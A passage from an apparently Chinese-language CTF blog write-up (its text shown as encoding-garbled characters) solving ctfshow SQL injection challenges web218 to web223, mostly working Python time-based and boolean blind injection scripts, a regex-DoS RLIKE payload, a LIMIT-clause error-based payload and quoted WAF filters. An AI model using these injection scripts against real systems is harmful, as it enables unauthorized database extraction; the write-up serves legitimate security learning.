</span></span><span class="line"><span class="ln">29</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">Timeout</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">            <span class="c1"># å¦‚æœè¯·æ±‚è¶…æ—¶ï¼Œè¯´æ˜å½“å‰ä½ç½®å­—ç¬¦çš„ASCIIç å¤§äºä¸­é—´å€¼</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;An unexpected error occurred: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">
</span></span><span class="line"><span class="ln">40</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">        <span class="c1"># å¦‚æœæ‰¾åˆ°æœ‰æ•ˆçš„å­—ç¬¦ï¼Œå°†å…¶æ·»åŠ åˆ°ç»“æœå­—ç¬¦ä¸²ä¸­</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">        <span class="c1"># å¦‚æœæ²¡æœ‰æ‰¾åˆ°æœ‰æ•ˆå­—ç¬¦ï¼Œé€€å‡ºå¾ªç¯</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">
</span></span><span class="line"><span class="ln">47</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*]Result : &#34;</span><span class="o">+</span><span class="n">result</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">
</span></span><span class="line"><span class="ln">49</span><span class="cl"><span class="c1"># ctfshow{d317911f-ac1e-4160-be70-47d01a0f2f45}</span>
</span></span></code></pre></div><p>ä¹±ç çš„è¯ï¼Œå¤šè·‘å‡ æ¬¡å°±å¥½äº†</p>
<p>å¦ä¸€ç§æ–¹æ³•å°±æ˜¯é€šè¿‡æ­£åˆ™ DOS RLIKEæ³¨å…¥</p>
<p>åˆ©ç”¨ SQL å¤šæ¬¡è®¡ç®—æ­£åˆ™æ¶ˆè€—è®¡ç®—èµ„æºäº§ç”Ÿå»¶æ—¶æ•ˆæœï¼Œä¸ benchmark åŸç†ç±»ä¼¼ï¼Œé€šè¿‡ rpad æˆ– repeat æ„é€ é•¿å­—ç¬¦ä¸²ï¼Œä»¥è®¡ç®—é‡å¤§çš„ patternã€‚</p>
<pre tabindex="0"><code>debug=1&amp;ip=repeat(rpad(&#39;a&#39;, 999999, &#39;a&#39;),16) rlike concat(repeat(&#39;(a.*)+&#39;,14), &#39;b&#39;)
</code></pre><h4 id="web219">web219<a hidden class="anchor" aria-hidden="true" href="#web219">#</a></h4>
<pre tabindex="0"><code>æŸ¥è¯¢è¯­å¥

       where id = ($id);
      
è¿”å›é€»è¾‘

    //å±è”½å±é™©åˆ†å­
    function waf($str){
        return preg_match(&#39;/sleep|benchmark|rlike/i&#39;,$str);
    }   
      
</code></pre><p>ç»§ç»­ä½¿ç”¨ç¬›å¡å°”ç§¯ç›²æ³¨å³å¯</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://61d55d79-847e-43d7-80e4-c221ceae9f4a.challenge.ctf.show/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="c1"># ASCIIç èŒƒå›´ï¼Œ32åˆ°127æ˜¯å¯æ‰“å°å­—ç¬¦çš„èŒƒå›´</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="c1"># äºŒåˆ†æŸ¥æ‰¾çš„ä¸­é—´å€¼</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="c1"># payload = &#34;select table_name from information_schema.tables where table_schema=database() limit 0,1&#34;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="c1"># payload = &#34;select column_name from information_schema.columns where table_name=&#39;ctfshow_flagxca&#39; limit 1,1&#34;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select flagaabc from ctfshow_flagxca&#34;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="s1">&#39;ip&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;1) or if(ascii(substr((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,(select count(*) from information_schema.columns A, information_schema.columns B),1)#&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="s1">&#39;debug&#39;</span><span class="p">:</span> <span class="s1">&#39;1&#39;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">            <span class="c1"># å‘é€POSTè¯·æ±‚ï¼Œè®¾ç½®è¶…æ—¶æ—¶é—´ä¸º1ç§’</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.15</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">            <span class="c1"># å¦‚æœè¯·æ±‚åœ¨1ç§’å†…è¿”å›ï¼Œè¯´æ˜å½“å‰ä½ç½®å­—ç¬¦çš„ASCIIç å°äºç­‰äºä¸­é—´å€¼</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">Timeout</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">            <span class="c1"># å¦‚æœè¯·æ±‚è¶…æ—¶ï¼Œè¯´æ˜å½“å‰ä½ç½®å­—ç¬¦çš„ASCIIç å¤§äºä¸­é—´å€¼</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;An unexpected error occurred: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">
</span></span><span class="line"><span class="ln">41</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">        <span class="c1"># å¦‚æœæ‰¾åˆ°æœ‰æ•ˆçš„å­—ç¬¦ï¼Œå°†å…¶æ·»åŠ åˆ°ç»“æœå­—ç¬¦ä¸²ä¸­</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">        <span class="c1"># å¦‚æœæ²¡æœ‰æ‰¾åˆ°æœ‰æ•ˆå­—ç¬¦ï¼Œé€€å‡ºå¾ªç¯</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">
</span></span><span class="line"><span class="ln">48</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*]Result : &#34;</span><span class="o">+</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="web220">web220<a hidden class="anchor" aria-hidden="true" href="#web220">#</a></h4>
<pre tabindex="0"><code>æŸ¥è¯¢è¯­å¥

       where id = ($id);
      
è¿”å›é€»è¾‘

    //å±è”½å±é™©åˆ†å­
    function waf($str){
        return preg_match(&#39;/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i&#39;,$str);
    }   
      
</code></pre><p>substrç”¨leftä»£æ›¿å³å¯ï¼Œæœ‰ç‚¹åƒä¹‹å‰å¸ƒå°”ç›²æ³¨çš„ä¸€é“é¢˜ï¼Œåªæ˜¯æ”¹æˆäº†æ—¶é—´ç›²æ³¨ç½¢äº†</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://52728b9a-ffae-4f96-b51f-0549bb5cb4e0.challenge.ctf.show/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nb">str</span><span class="o">=</span><span class="s2">&#34; _</span><span class="si">{}</span><span class="s2">-&#34;</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">45</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="c1"># payload = &#34;select table_name from information_schema.tables where table_schema=database() limit 0,1&#34;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="c1"># payload = &#34;select column_name from information_schema.columns where table_name=&#39;ctfshow_flagxcac&#39; limit 1,1&#34;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select flagaabcc from ctfshow_flagxcac&#34;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">            <span class="s1">&#39;ip&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;1) or if(LEFT((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">)regexp(&#39;</span><span class="si">{</span><span class="n">result</span><span class="o">+</span><span class="n">j</span><span class="si">}</span><span class="s2">&#39;),(select count(*) from information_schema.columns A, information_schema.columns B),1)#&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">            <span class="s1">&#39;debug&#39;</span><span class="p">:</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.15</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">+</span> <span class="n">j</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] loading :&#34;</span><span class="o">+</span><span class="n">result</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] result :&#34;</span><span class="o">+</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="web221">web221<a hidden class="anchor" aria-hidden="true" href="#web221">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">æŸ¥è¯¢è¯­å¥</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="c1">//åˆ†é¡µæŸ¥è¯¢
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="nx">select</span> <span class="o">*</span> <span class="nx">from</span> <span class="nx">ctfshow_user</span> <span class="nx">limit</span> <span class="p">(</span><span class="nv">$page</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="nv">$limit</span><span class="p">,</span><span class="nv">$limit</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">è¿”å›é€»è¾‘</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl"><span class="c1">//TODO:å¾ˆå®‰å…¨ï¼Œä¸éœ€è¦è¿‡æ»¤
</span></span></span><span class="line"><span class="ln">9</span><span class="cl"><span class="c1">//æ‹¿åˆ°æ•°æ®åº“åå­—å°±ç®—ä½ èµ¢
</span></span></span></code></pre></div><p>pç¥çš„æ–‡ç« æœ‰æåˆ°limitæ³¨å…¥</p>
<p><a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">[è½¬è½½]Mysqlä¸‹Limitæ³¨å…¥æ–¹æ³• | ç¦»åˆ«æ­Œ</a></p>
<p><img alt="image-20250214215951430" loading="lazy" src="./assets/image-20250214215951430.png"></p>
<p>payload:</p>
<pre tabindex="0"><code>?page=1&amp;limit=1%20procedure%20analyse(extractvalue(rand(),concat(0x3a,database())),1)
</code></pre><p><img alt="image-20250214220519994" loading="lazy" src="./assets/image-20250214220519994.png"></p>
<h4 id="groupæ³¨å…¥">groupæ³¨å…¥<a hidden class="anchor" aria-hidden="true" href="#groupæ³¨å…¥">#</a></h4>
<h4 id="web222">web222<a hidden class="anchor" aria-hidden="true" href="#web222">#</a></h4>
<pre tabindex="0"><code>æŸ¥è¯¢è¯­å¥

  //åˆ†é¡µæŸ¥è¯¢
  $sql = select * from ctfshow_user group by $username;
      
è¿”å›é€»è¾‘

//TODO:å¾ˆå®‰å…¨ï¼Œä¸éœ€è¦è¿‡æ»¤
</code></pre><p><img alt="image-20250215150334370" loading="lazy" src="./assets/image-20250215150334370.png"></p>
<p>group by å¯ä»¥è¿›è¡Œæ—¶é—´ç›²æ³¨ï¼Œå¸ƒå°”ç›²æ³¨ç­‰</p>
<p>æœ¬æ¥ä»¥ä¸ºæ˜¯æŠ¥é”™æ³¨å…¥çš„ï¼Œå‘ç°å¥½åƒä¸å¤ªè¡Œ</p>
<p>è¿˜æ˜¯çš„æ—¶é—´ç›²æ³¨</p>
<p>æ‹¿å‰é¢çš„ç›²æ³¨è„šæœ¬æ”¹ä¸€æ”¹</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://529d9311-c036-4831-bfa1-b2ca91dae190.challenge.ctf.show/api/?u=&#34;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="c1"># ASCIIç èŒƒå›´ï¼Œ32åˆ°127æ˜¯å¯æ‰“å°å­—ç¬¦çš„èŒƒå›´</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="c1"># äºŒåˆ†æŸ¥æ‰¾çš„ä¸­é—´å€¼</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="c1"># æŸ¥è¡¨å</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="c1"># æŸ¥åˆ—åå­—</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="c1"># payload = &#34;select column_name from information_schema.columns where table_name=&#39;ctfshow_flaga&#39; limit 1,1&#34;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="c1"># çˆ†å­—æ®µ</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select flagaabc from ctfshow_flaga&#34;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;concat((if (ascii(substr((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">, sleep(0.05), 2)), 1);&#34;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.05</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">Timeout</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">            <span class="c1"># å¦‚æœè¯·æ±‚è¶…æ—¶ï¼Œè¯´æ˜å½“å‰ä½ç½®å­—ç¬¦çš„ASCIIç å¤§äºä¸­é—´å€¼</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;An unexpected error occurred: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">
</span></span><span class="line"><span class="ln">38</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">        <span class="c1"># å¦‚æœæ‰¾åˆ°æœ‰æ•ˆçš„å­—ç¬¦ï¼Œå°†å…¶æ·»åŠ åˆ°ç»“æœå­—ç¬¦ä¸²ä¸­</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">        <span class="c1"># å¦‚æœæ²¡æœ‰æ‰¾åˆ°æœ‰æ•ˆå­—ç¬¦ï¼Œé€€å‡ºå¾ªç¯</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*]Result : &#34;</span><span class="o">+</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="web223">web223<a hidden class="anchor" aria-hidden="true" href="#web223">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">æŸ¥è¯¢è¯­å¥</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="c1">//åˆ†é¡µæŸ¥è¯¢
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="nx">select</span> <span class="o">*</span> <span class="nx">from</span> <span class="nx">ctfshow_user</span> <span class="nx">group</span> <span class="nx">by</span> <span class="nv">$username</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">è¿”å›é€»è¾‘</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl"><span class="c1">//TODO:å¾ˆå®‰å…¨ï¼Œä¸éœ€è¦è¿‡æ»¤
</span></span></span><span class="line"><span class="ln">9</span><span class="cl"><span class="c1">//ç”¨æˆ·åä¸èƒ½æ˜¯æ•°å­—
</span></span></span></code></pre></div><p>è¿™é¢˜banæ‰äº†æ•°å­—</p>
<p>ç”¨trueæ¥æ„é€ å‡ºæ•°å­—å³å¯</p>
<p>è¿™é¢˜ä¸€å¼€å§‹æˆ‘æƒ³ç”¨æ—¶é—´ç›²æ³¨çš„ï¼Œä½†æ˜¯è·‘ä¸å‡ºæ¥ï¼Œåé¢ç›´æ¥æ‹¿y4âœŒçš„å¸ƒå°”ç›²æ³¨è·‘äº†</p>
<p>å¦‚ä¸‹</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
